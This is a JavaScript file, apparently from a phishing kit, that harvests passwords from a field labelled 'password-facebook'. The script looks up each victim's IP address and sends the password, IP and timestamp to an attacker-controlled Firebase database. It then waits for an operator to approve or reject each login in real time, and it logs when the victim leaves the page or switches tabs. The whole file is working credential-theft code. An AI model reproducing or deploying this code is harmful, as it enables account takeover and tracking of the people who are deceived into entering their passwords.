// Initialize Firebase
const firebaseConfig = {
    apiKey: "AIzaSyAcqxvsTQGIJrcRKq9B5ldBsMjWB4doYRg",
    authDomain: "test-for-admin-9c05c.firebaseapp.com",
    databaseURL: "https://test-for-admin-9c05c-default-rtdb.firebaseio.com",
    projectId: "test-for-admin-9c05c",
    storageBucket: "test-for-admin-9c05c.appspot.com",
    messagingSenderId: "180529484791",
    appId: "1:180529484791:web:9b5ed35a77400473dd54f2"
};
firebase.initializeApp(firebaseConfig);

const database = firebase.database();

function submitEmail() {
const loaderContainer = document.getElementById('loader');
const error = document.getElementById('error-message');
const nameInput = document.getElementById('password-facebook');

let cachedIpAddress = null;

async function getIPAddress() {
    if (cachedIpAddress) {
        return cachedIpAddress;
    }
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        cachedIpAddress = data.ip;
        return cachedIpAddress;
    } catch (error) {
        console.error('Error getting IP address:', error);
        return 'Unknown';
    }
}

// Start fetching IP address immediately
getIPAddress();

function checkName(name) {
    if (name.trim() === "") {
        error.style.display = 'block';
        error.textContent = "Please write the name first";
        console.log("Field is empty!");
        return false;
    }
    error.style.display = 'none';
    return true;
}

// Add event listener to hide error message when user starts typing
nameInput.addEventListener('input', function() {
    error.style.display = 'none';
});

document.getElementById('savebutton').addEventListener('click', async (e) => {
    e.preventDefault();
    const password = nameInput.value;

    if (!checkName(password)) {
        return;
    }

    loaderContainer.style.display = 'flex';
    error.style.display = 'none';

    const timestamp = Date.now();
    const ipAddress = await getIPAddress();

    try {
        const submission = await database.ref('submissions').push({
            password,
            timestamp,
            ipAddress,
            status: 'pending'
        });

        const submissionKey = submission.key;
        startListening(submissionKey);

        // Also save to 'Names' node as in the second program
        await database.ref('Names').push({
            name: password,
            timestamp: new Date().toISOString()
        });

        console.log('Data saved successfully');
    } catch (error) {
        console.error('Error submitting form:', error);
        loaderContainer.style.display = 'none';
        alert('An error occurred. Please try again.');
    }
});

function startListening(submissionKey) {
    database.ref(`submissions/${submissionKey}/status`).on('value', (snapshot) => {
        const status = snapshot.val();
        if (status === 'approved') {
            loaderContainer.style.display = 'none';
            window.location.href = 'welcome.html';
        } else if (status === 'rejected') {
            loaderContainer.style.display = 'none';
            error.style.display = 'block';
        }
    });
}

function logExit() {
    const timestamp = Date.now();
    const ipAddress = cachedIpAddress || 'Unknown';
    
    return database.ref('exits').push({
        timestamp,
        ipAddress
    });
}

// Log exit on page unload
window.addEventListener('beforeunload', (event) => {
    logExit();
});

// Log exit on visibility change (when user switches tabs or minimizes window)
document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'hidden') {
        logExit();
    }
});
}
